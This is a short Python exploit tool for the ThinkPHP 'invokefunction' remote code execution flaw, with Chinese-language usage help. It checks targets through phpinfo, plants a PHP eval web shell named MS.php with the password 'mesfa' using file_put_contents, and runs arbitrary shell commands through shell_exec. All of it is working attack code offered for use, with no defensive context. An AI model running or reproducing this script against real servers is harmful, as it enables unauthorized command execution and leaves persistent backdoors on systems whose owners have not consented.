#coding:utf-8
import sys
import requests
def verify(target_url):
    headers = {
        'User_Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'
    }
    resp = requests.get(target_url,headers=headers)
    if "SERVER_ADDR" in resp.content.decode():
        print("检测到漏洞")
        with open("phpinfo.html", 'wb') as f:
            f.write(resp.content)
def get_shell(url):
    taget_url = url+r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=MS.php&vars[1][1]=<?php%20@eval($_POST[%27mesfa%27])?>'
    resp = requests.get(taget_url)
    if resp.status_code==200:
        print("[+]"+url+"/MS.php   Pass:mesfa")
def getcode_run(url,cmd):
    taget_url = url+ r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='+cmd
    resp = requests.get(taget_url)
    print(resp.text)
    # html = etree.HTML(resp.text)
    # print(html)
    # print(html.xpath('/html/body/text()'))
def help():
    print('''
    #验证漏洞
    python3 thinkphp.py target_url verify
    #getshell
    python3 thinkphp.py target_url getshell
    #命令执行
    python3 thinphp.py target_url -c cmd 
    ''')
if __name__ == '__main__':
    args = sys.argv
    url = args[1]
    taget_url = url+r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
    if args[2] == 'verify':
        verify(taget_url)
    if args[2] == 'getshell':
        get_shell(args[1])
    if args[2] =='-c':
        getcode_run(args[1],args[3])
    if args[2]=='-h':
        help()